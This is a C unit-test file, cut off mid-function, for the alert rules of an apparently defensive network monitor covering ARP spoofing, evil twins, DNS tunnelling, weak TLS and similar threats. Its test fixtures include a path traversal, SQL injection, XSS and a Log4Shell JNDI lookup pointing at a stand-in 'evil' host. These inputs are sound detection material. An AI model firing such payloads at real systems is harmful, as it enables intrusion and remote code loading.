#include <string.h>
#include <time.h>
#include "runner.h"
#include "sloth.h"
#include "alerts.h"
#include "views/alerts.h"

/* Helpers — build state with the exact preconditions a rule needs. */

static void seed_state(sloth_state_t *s) {
    memset(s, 0, sizeof(*s));
}

static void add_scan(sloth_state_t *s, const char *ip, int ports, int flagged) {
    scan_entry_t *e = &s->scan_entries[s->scan_count++];
    snprintf(e->ip, sizeof(e->ip), "%s", ip);
    e->port_count = ports;
    e->flagged    = flagged;
    e->first_seen = time(NULL);
    e->last_seen  = time(NULL);
}

static void add_deauth_flood(sloth_state_t *s, const uint8_t dst_mac[6]) {
    deauth_event_t *e = &s->deauth_events[s->deauth_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->dst, dst_mac, 6);
    e->reason = 7;
    e->count  = 20;
    e->flood  = 1;
}

/* Variant for tests that need to assert detail/key content — caller
 * supplies both dst and bssid so the formatted MACs are predictable. */
static void add_deauth_flood_full(sloth_state_t *s,
                                   const uint8_t dst_mac[6],
                                   const uint8_t bssid[6],
                                   uint16_t reason, int count) {
    deauth_event_t *e = &s->deauth_events[s->deauth_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->dst,   dst_mac, 6);
    memcpy(e->bssid, bssid,   6);
    e->reason = reason;
    e->count  = count;
    e->flood  = 1;
}

static void add_dns_nxdomain(sloth_state_t *s, const char *src,
                              const char *qname, time_t ts) {
    if (s->dns_log_count >= MAX_DNS_LOG) return;
    dns_log_entry_t *e = &s->dns_log[s->dns_log_count++];
    snprintf(e->src,    sizeof(e->src),    "%s", src);
    snprintf(e->qname,  sizeof(e->qname),  "%s", qname);
    snprintf(e->qtype,  sizeof(e->qtype),  "A");
    snprintf(e->answer, sizeof(e->answer), "NXDOMAIN");
    e->is_resp = 1;
    e->ts      = ts;
}

static void add_dns_query(sloth_state_t *s, const char *src, const char *qname) {
    if (s->dns_log_count >= MAX_DNS_LOG) return;
    dns_log_entry_t *e = &s->dns_log[s->dns_log_count++];
    snprintf(e->src,    sizeof(e->src),    "%s", src);
    snprintf(e->qname,  sizeof(e->qname),  "%s", qname);
    snprintf(e->qtype,  sizeof(e->qtype),  "A");
    e->ts = time(NULL);
}

static void add_conn(sloth_state_t *s, const char *remote, uint16_t port) {
    conn_t *c = &s->conns[s->conn_count++];
    snprintf(c->local_addr,  sizeof(c->local_addr),  "192.168.1.5");
    snprintf(c->remote_addr, sizeof(c->remote_addr), "%s", remote);
    c->local_port  = 12345;
    c->remote_port = port;
    c->proto       = PROTO_TCP;
}

static int find_alert(const sloth_state_t *s, alert_type_t type) {
    for (int i = 0; i < s->alert_count; i++)
        if (s->alerts[i].type == type) return i;
    return -1;
}

/* ── Rule firing ─────────────────────────────────────────── */

static void test_port_scan_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);

    alerts_update(&s);
    ASSERT_GT(s.alert_count, 0);
    int idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    /* PORT_SCAN is LOW — reconnaissance, not an active attack. */
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_LOW);
    ASSERT_STR(s.alerts[idx].title, "PORT_SCAN");
}

static void test_port_scan_not_flagged_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 3, 0);   /* below threshold, not flagged */
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PORT_SCAN), -1);
}

static void test_deauth_flood_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff };
    add_deauth_flood(&s, mac);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

/* Kills the mac_to_str byte-index mutations (line 25) AND the
 * rule_deauth_flood detail-format mutations (lines 119-121): both
 * formatted MACs must appear in canonical lowercase-hex byte order,
 * and the reason/count must surface verbatim. */
static void test_deauth_flood_detail_content(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t dst[6]   = {0x12,0x34,0x56,0x78,0x9a,0xbc};
    uint8_t bssid[6] = {0xde,0xad,0xbe,0xef,0x00,0x42};
    add_deauth_flood_full(&s, dst, bssid, /*reason*/ 7, /*count*/ 25);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    ASSERT(strstr(d, "12:34:56:78:9a:bc") != NULL);
    ASSERT(strstr(d, "de:ad:be:ef:00:42") != NULL);
    ASSERT(strstr(d, "reason=7")  != NULL);
    ASSERT(strstr(d, "count=25")  != NULL);
    /* Dedup key is "deauth:<dst>" — keep the same client at one alert. */
    ASSERT(strstr(s.alerts[idx].key, "deauth:12:34:56:78:9a:bc") != NULL);
}

static void test_nxdomain_burst_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t now = time(NULL);
    for (int i = 0; i < ALERT_NXDOMAIN_THRESH; i++) {
        char qn[32];
        snprintf(qn, sizeof(qn), "miss%d.example", i);
        add_dns_nxdomain(&s, "10.0.0.50", qn, now);
    }
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_NXDOMAIN_BURST) >= 0);
}

static void test_nxdomain_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t now = time(NULL);
    for (int i = 0; i < ALERT_NXDOMAIN_THRESH - 1; i++) {
        char qn[32];
        snprintf(qn, sizeof(qn), "miss%d.example", i);
        add_dns_nxdomain(&s, "10.0.0.50", qn, now);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_NXDOMAIN_BURST), -1);
}

static void test_nxdomain_outside_window_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t old = time(NULL) - (ALERT_NXDOMAIN_WINDOW_S + 10);
    for (int i = 0; i < ALERT_NXDOMAIN_THRESH + 5; i++) {
        char qn[32];
        snprintf(qn, sizeof(qn), "miss%d.example", i);
        add_dns_nxdomain(&s, "10.0.0.50", qn, old);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_NXDOMAIN_BURST), -1);
}

static void test_threat_domain_fires_on_ioc(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dns_query(&s, "192.168.1.5", "malware.testing.com");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_THREAT_DOMAIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_threat_domain_clean_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dns_query(&s, "192.168.1.5", "google.com");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_THREAT_DOMAIN), -1);
}

static void test_threat_ip_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_conn(&s, "192.0.2.66", 443);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_THREAT_IP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void seed_arp(sloth_state_t *s, const char *ip,
                      uint8_t a, uint8_t b, uint8_t c,
                      uint8_t d, uint8_t e, uint8_t f) {
    if (s->arp_count >= MAX_ARP_ENTRIES) return;
    arp_entry_t *ar = &s->arp_entries[s->arp_count++];
    memset(ar, 0, sizeof(*ar));
    snprintf(ar->ip, sizeof(ar->ip), "%s", ip);
    ar->mac[0] = a; ar->mac[1] = b; ar->mac[2] = c;
    ar->mac[3] = d; ar->mac[4] = e; ar->mac[5] = f;
}

static void test_arp_spoof_no_alert_on_first_obs(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

static void test_arp_spoof_fires_on_mac_change(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);

    /* Second poll — same IP, different MAC. */
    s.arp_count = 0;
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x99);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ARP_SPOOF);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_arp_spoof_silent_on_same_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    s.arp_count = 0;
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

static void test_arp_spoof_skips_multicast_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Multicast bit set (0x01) — ARP shouldn't normally see this,
     * but the rule should defensively skip. */
    seed_arp(&s, "224.0.0.1", 0x01, 0x00, 0x5e, 0x00, 0x00, 0x01);
    alerts_update(&s);
    s.arp_count = 0;
    seed_arp(&s, "224.0.0.1", 0x01, 0x00, 0x5e, 0x00, 0x00, 0xff);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

/* Kills the `all_zero = 1` init mutation AND the `j < 6` byte-loop bound
 * mutations: if the rule ever stops skipping an all-zero MAC, it will
 * subsequently treat the all-zero MAC as a legitimate observation and
 * fire ARP_SPOOF the next time a real MAC appears for that IP. */
static void test_arp_spoof_skips_all_zero_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "10.0.0.42", 0, 0, 0, 0, 0, 0);
    alerts_update(&s);
    s.arp_count = 0;
    /* If the all-zero MAC was recorded, a real MAC for the same IP
     * will now look like a spoof. The rule must have skipped, so this
     * is treated as a first observation and no alert fires. */
    seed_arp(&s, "10.0.0.42", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

/* Kills const-mutations on the snprintf byte indices (lines 209-215):
 * if mac[k] indices drift, the formatted MAC strings in the alert
 * detail will no longer match the canonical form. */
static void test_arp_spoof_detail_contains_both_macs(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Both MACs use even first-byte (multicast bit clear) so the rule
     * doesn't skip them — 0x11 would have looked random but its LSB
     * marks it as multicast. */
    seed_arp(&s, "192.168.1.7", 0x10, 0x22, 0x33, 0x44, 0x55, 0x66);
    alerts_update(&s);
    s.arp_count = 0;
    seed_arp(&s, "192.168.1.7", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ARP_SPOOF);
    ASSERT(idx >= 0);
    /* New MAC must appear, formatted byte-by-byte in canonical order. */
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:dd:ee:ff") != NULL);
    /* Old MAC must appear too — detail is "X now claims MAC Y (was Z)". */
    ASSERT(strstr(s.alerts[idx].detail, "10:22:33:44:55:66") != NULL);
    /* IP must appear as the subject of the alert. */
    ASSERT(strstr(s.alerts[idx].detail, "192.168.1.7") != NULL);
}

/* Kills the `g_arp_hist_n >= MAX_ARP_ENTRIES` overflow guard mutation
 * (`>= -> >`): if the guard loosens by one, the rule writes past the
 * end of g_arp_hist. After saturating the history with first-observations,
 * one more new IP must not crash and must not record. The follow-up
 * spoof check for that overflowing IP must still treat it as a first
 * observation (no alert), proving the entry was rejected by the guard. */
static void test_arp_spoof_history_overflow_safe(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Saturate history with MAX_ARP_ENTRIES distinct IPs, each a fresh
     * observation. We can't fit them all in one poll (arp_entries is
     * also MAX_ARP_ENTRIES wide), so chunk in batches. */
    char ip[32];
    int total = 0;
    while (total < MAX_ARP_ENTRIES) {
        s.arp_count = 0;
        int batch = MAX_ARP_ENTRIES - total;
        if (batch > 64) batch = 64;
        for (int i = 0; i < batch; i++) {
            snprintf(ip, sizeof(ip), "10.%d.%d.1",
                     (total + i) / 256, (total + i) % 256);
            seed_arp(&s, ip, 0xaa, 0xbb, 0xcc, 0xdd,
                     (uint8_t)((total + i) >> 8),
                     (uint8_t)(total + i));
        }
        alerts_update(&s);
        total += batch;
    }
    /* History is now full. A brand-new IP must not be recorded; if the
     * guard mutated to `>` we'd write past g_arp_hist. */
    s.arp_count = 0;
    seed_arp(&s, "172.16.0.99", 0x01, 0x02, 0x03, 0x04, 0x05, 0x06);
    alerts_update(&s);
    /* The overflow IP wasn't recorded — a different MAC on the next
     * poll must still look like a first observation, not a spoof. */
    s.arp_count = 0;
    seed_arp(&s, "172.16.0.99", 0x99, 0x88, 0x77, 0x66, 0x55, 0x44);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

/* ── Evil-twin AP ────────────────────────────────────────── */

static void add_beacon(sloth_state_t *s, const char *ssid,
                        const uint8_t bssid[6], const char *enc) {
    if (s->beacon_count >= MAX_BEACON_APS) return;
    beacon_ap_t *b = &s->beacon_aps[s->beacon_count++];
    memset(b, 0, sizeof(*b));
    snprintf(b->ssid, sizeof(b->ssid), "%s", ssid);
    memcpy(b->bssid, bssid, 6);
    snprintf(b->enc, sizeof(b->enc), "%s", enc);
    b->channel    = 6;
    b->signal_dbm = -55;
    b->last_seen  = time(NULL);
}

static void test_evil_twin_open_plus_wpa2_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Cafe-Free", a, "OPEN");
    add_beacon(&s, "Cafe-Free", b, "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_evil_twin_two_wpa2_no_fire(void) {
    /* Legit mesh / multi-AP enterprise — same SSID + same strong
     * security across BSSIDs. No alert. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Office", a, "WPA2");
    add_beacon(&s, "Office", b, "WPA2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

static void test_evil_twin_two_open_no_fire(void) {
    /* Both BSSIDs OPEN — common at airports, no strong sibling to
     * mismatch against. No alert. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Airport-Free", a, "OPEN");
    add_beacon(&s, "Airport-Free", b, "OPEN");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

static void test_evil_twin_different_ssids_no_fire(void) {
    /* OPEN AP and WPA2 AP with DIFFERENT SSIDs — coincidence, not
     * twin. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Open-Net", a, "OPEN");
    add_beacon(&s, "Locked",   b, "WPA2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

/* Kills the per-byte snprintf mutations on both BSSIDs (lines 594-599):
 * the detail string must contain the SSID and both BSSIDs in canonical
 * lowercase-hex byte order. */
static void test_evil_twin_detail_contains_bssids_and_ssid(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Distinctive byte patterns so a wrong index would render a
     * visibly-different string. */
    uint8_t a[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0xff};
    add_beacon(&s, "TwinNet", a, "OPEN");
    add_beacon(&s, "TwinNet", b, "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    ASSERT(strstr(d, "TwinNet")           != NULL);
    ASSERT(strstr(d, "11:22:33:44:55:66") != NULL);
    ASSERT(strstr(d, "aa:bb:cc:dd:ee:ff") != NULL);
    /* Dedup key is "twin:<ssid>" — stable across the (a,b) /
     * (b,a) iteration ordering. */
    ASSERT(strstr(s.alerts[idx].key, "twin:TwinNet") != NULL);
}

/* ── DNS tunnel ───────────────────────────────────────────── */

static void test_dns_tunnel_fires_on_long_subdomain_burst(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* 20 queries to evil.example, half with a long encoded subdomain. */
    for (int i = 0; i < 20; i++) {
        char qname[80];
        if (i % 2 == 0) {
            /* 32-char hex-encoded label = "tunnel payload". */
            snprintf(qname, sizeof(qname),
                     "abcdef0123456789abcdef0123456789.evil.example");
        } else {
            snprintf(qname, sizeof(qname), "short%d.evil.example", i);
        }
        add_dns_query(&s, "192.168.1.5", qname);
    }
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DNS_TUNNEL);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_dns_tunnel_normal_traffic_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* 30 normal queries to one popular parent — no long subdomains. */
    for (int i = 0; i < 30; i++) {
        char qname[64];
        snprintf(qname, sizeof(qname), "a%d.google.com", i);
        add_dns_query(&s, "192.168.1.5", qname);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_DNS_TUNNEL), -1);
}

static void test_dns_tunnel_few_long_no_fire(void) {
    /* Long subdomain count below threshold (8) — silent. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 20; i++) {
        char qname[80];
        if (i < 3) {
            snprintf(qname, sizeof(qname),
                     "abcdef0123456789abcdef0123456789.example.com");
        } else {
            snprintf(qname, sizeof(qname), "x%d.example.com", i);
        }
        add_dns_query(&s, "192.168.1.5", qname);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_DNS_TUNNEL), -1);
}

/* ── Weak TLS ────────────────────────────────────────────── */

static void add_tls(sloth_state_t *s, const char *src, const char *dst,
                     const char *host, const char *ver) {
    if (s->tls_log_count >= MAX_TLS_LOG) return;
    tls_log_entry_t *e = &s->tls_log[s->tls_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src,     sizeof(e->src),     "%s", src);
    snprintf(e->dst,     sizeof(e->dst),     "%s", dst);
    snprintf(e->host,    sizeof(e->host),    "%s", host);
    snprintf(e->tls_ver, sizeof(e->tls_ver), "%s", ver);
    e->ts = time(NULL);
}

static void test_weak_tls_tls10_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "legacy.example", "TLS 1.0");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_WEAK_TLS);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_weak_tls_sslv3_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "legacy.example", "SSL 3.0");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_WEAK_TLS) >= 0);
}

static void test_weak_tls_tls13_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "modern.example", "TLS 1.3");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WEAK_TLS), -1);
}

static void test_weak_tls_tls12_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_tls(&s, "10.0.0.5", "1.2.3.4", "modern.example", "TLS 1.2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_WEAK_TLS), -1);
}

/* ── Attack-tool User-Agent ──────────────────────────────── */

static void add_http(sloth_state_t *s, const char *src,
                      const char *host, const char *ua) {
    if (s->http_log_count >= MAX_HTTP_LOG) return;
    http_log_entry_t *e = &s->http_log[s->http_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src,        sizeof(e->src),        "%s", src);
    snprintf(e->host,       sizeof(e->host),       "%s", host);
    snprintf(e->method,     sizeof(e->method),     "GET");
    snprintf(e->path,       sizeof(e->path),       "/");
    snprintf(e->user_agent, sizeof(e->user_agent), "%s", ua);
    e->ts = time(NULL);
}

static void add_http_path(sloth_state_t *s, const char *src,
                           const char *host, const char *path) {
    if (s->http_log_count >= MAX_HTTP_LOG) return;
    http_log_entry_t *e = &s->http_log[s->http_log_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->src,        sizeof(e->src),        "%s", src);
    snprintf(e->host,       sizeof(e->host),       "%s", host);
    snprintf(e->method,     sizeof(e->method),     "GET");
    snprintf(e->path,       sizeof(e->path),       "%s", path);
    e->ts = time(NULL);
}

static void test_attack_path_traversal_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/files?name=../../etc/passwd");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_sqli_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/products?id=1+union+select+null,version()");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_log4shell_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/?x=${jndi:ldap://evil/exploit}");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_xss_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/search?q=%3Cscript%3Ealert(1)%3C/script%3E");
    /* That's the encoded form; not all encoded variants are caught.
     * Use the raw-script variant which IS in the table. */
    add_http_path(&s, "10.0.0.5", "target.example",
                  "/search?q=<script>alert(1)</script>");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_PATH) >= 0);
}

static void test_attack_path_normal_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http_path(&s, "10.0.0.5", "google.com", "/search?q=hello+world");
    add_http_path(&s, "10.0.0.5", "example.com", "/api/v1/users/42");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ATTACK_PATH), -1);
}

static void test_attack_tool_ua_sqlmap_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http(&s, "10.0.0.5", "target.example",
             "sqlmap/1.7.5#stable (http://sqlmap.org)");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ATTACK_TOOL_UA);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_attack_tool_ua_nmap_case_insensitive(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http(&s, "10.0.0.5", "target.example", "Mozilla/5.0 (NMAP scripting)");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_ATTACK_TOOL_UA) >= 0);
}

static void test_attack_tool_ua_normal_browser_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_http(&s, "10.0.0.5", "google.com",
             "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0");
    add_http(&s, "10.0.0.5", "example.com",
             "curl/8.4.0");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ATTACK_TOOL_UA), -1);
}

/* ── Probe flood ─────────────────────────────────────────── */

static void seed_probe_client(sloth_state_t *s, const uint8_t mac[6],
                                int frames, long elapsed_s) {
    if (s->probe_count >= MAX_PROBE_CLIENTS) return;
    probe_client_t *p = &s->probe_clients[s->probe_count++];
    memset(p, 0, sizeof(*p));
    memcpy(p->mac, mac, 6);
    p->frame_count = frames;
    p->last_seen   = time(NULL);
    p->first_seen  = p->last_seen - elapsed_s;
    p->signal_dbm  = -55;
    p->channel     = 6;
}

static void test_probe_flood_fires_on_high_rate(void) {
    /* 40 probes in 5 s = 8/s — above threshold. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 40, 5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PROBE_FLOOD);
    ASSERT(idx >= 0);
    /* PROBE_FLOOD is LOW — recon noise; real harm is PNL leakage. */
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_LOW);
}

static void test_probe_flood_low_total_no_fire(void) {
    /* 10 probes — below frame threshold (30). */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 10, 10);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PROBE_FLOOD), -1);
}

static void test_probe_flood_too_brief_no_fire(void) {
    /* 40 probes in 1s — elapsed below 5s window, suspect single
     * burst rather than sustained scan. Stay silent. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 40, 1);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PROBE_FLOOD), -1);
}

/* Kills the `frame_count < PROBE_FLOOD_FRAMES` threshold mutation
 * (`<` → `<=`): the rule fires *at* the threshold, not one above. */
static void test_probe_flood_exactly_at_frame_threshold_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    /* PROBE_FLOOD_FRAMES = 30, PROBE_FLOOD_WINDOW_S = 5. */
    seed_probe_client(&s, mac, 30, 5);
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_PROBE_FLOOD) >= 0);
}

/* Sibling boundary test: one frame below threshold stays silent. */
static void test_probe_flood_one_below_frame_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = {0x02,0xaa,0xbb,0xcc,0xdd,0xee};
    seed_probe_client(&s, mac, 29, 5);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PROBE_FLOOD), -1);
}

/* Kills the per-byte MAC-index mutations (lines 430-431): the detail
 * string must contain the offending client's MAC in canonical order. */
static void test_probe_flood_detail_contains_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Distinctive bytes so a wrong index would render visibly. */
    uint8_t mac[6] = {0x02,0x12,0x34,0x56,0x78,0x9a};
    seed_probe_client(&s, mac, 60, 10);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PROBE_FLOOD);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].detail, "02:12:34:56:78:9a") != NULL);
    /* Key is "probe_flood:<mac>" — same dedup story. */
    ASSERT(strstr(s.alerts[idx].key, "probe_flood:02:12:34:56:78:9a") != NULL);
}

/* ── KARMA / Pineapple ───────────────────────────────────── */

static void seed_karma_ap(sloth_state_t *s, const uint8_t bssid[6],
                           const char *const *ssids, int n_ssids) {
    if (s->beacon_count >= MAX_BEACON_APS) return;
    beacon_ap_t *b = &s->beacon_aps[s->beacon_count++];
    memset(b, 0, sizeof(*b));
    memcpy(b->bssid, bssid, 6);
    snprintf(b->enc, sizeof(b->enc), "OPEN");
    int cap = n_ssids < MAX_AP_SSID_HISTORY ? n_ssids : MAX_AP_SSID_HISTORY;
    for (int i = 0; i < cap; i++)
        snprintf(b->ssid_history[i], 33, "%s", ssids[i]);
    b->ssid_history_n = cap;
    if (cap > 0) snprintf(b->ssid, sizeof(b->ssid), "%s", ssids[cap - 1]);
    b->channel    = 6;
    b->signal_dbm = -55;
    b->last_seen  = time(NULL);
}

static void test_karma_three_ssids_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
